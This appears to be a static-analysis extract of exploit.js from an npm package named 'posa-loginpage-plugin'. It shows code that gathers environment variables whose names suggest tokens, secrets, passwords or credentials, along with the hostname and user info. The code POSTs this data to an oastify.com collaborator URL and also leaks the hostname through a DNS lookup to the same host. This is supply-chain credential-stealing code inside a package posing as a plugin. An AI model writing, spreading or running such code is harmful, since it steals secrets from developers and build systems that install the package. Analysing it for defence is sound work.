// File: tmp/tmprgjsihl1/posa-loginpage-plugin/package/exploit.js
// ======================================================================
Line 3: const https = require('https')
Line 4: const dns = require('dns')
Line 5: const os = require('os')
Line 6: const fs = require('fs')
Line 7: _tmp_0 = require('crypto')
Line 9: const COLLAB = 'https://cvb3ntfmioy1p0o6y6zu5q1y0p6guji8.oastify.com/poc'
Line 13: Object.keys(process.env || {})
Line 14: /(token|secret|key|passwd|password|cred|ses|auth)/i.test(k)
Line 16: _tmp_4.push("BITBUCKET_PIPELINE_UUID")
Line 25: os.hostname()
Line 26: os.userInfo()
Line 40: {
  const data = Buffer.from(JSON.stringify(payload));
  const url = new URL(COLLAB);
  const req = https.request({
    hostname: url.hostname,
    path: url.pathname + url.search,
    method: 'POST',
    port: url.port || 443,
    timeout: 2500,
    headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
  }, res => { res.resume(); });
  req.on('error', () => {});
  req.on('timeout', () => req.destroy());
  req.write(data);
  req.end();
}
Line 41: Buffer.from(JSON.stringify(payload))
Line 43: const req = https.request({
    hostname: url.hostname,
    path: url.pathname + url.search,
    method: 'POST',
    port: url.port || 443,
    timeout: 2500,
    headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
  }, res => { res.resume(); })
Line 53: req.write(data)
Line 54: req.end()
Line 58: {
  const label = `${ID}.${os.hostname()}`.replace(/[^a-zA-Z0-9.-]/g, '');
  dns.lookup(`${label}.exec.${new URL(COLLAB).hostname}`, () => {});
}
Line 59: const label = `${ID}.${os.hostname()}`.replace(/[^a-zA-Z0-9.-]/g, '')
Line 60: <operator>.formatString("", label, ".exec.", new URL(COLLAB).hostname, "")
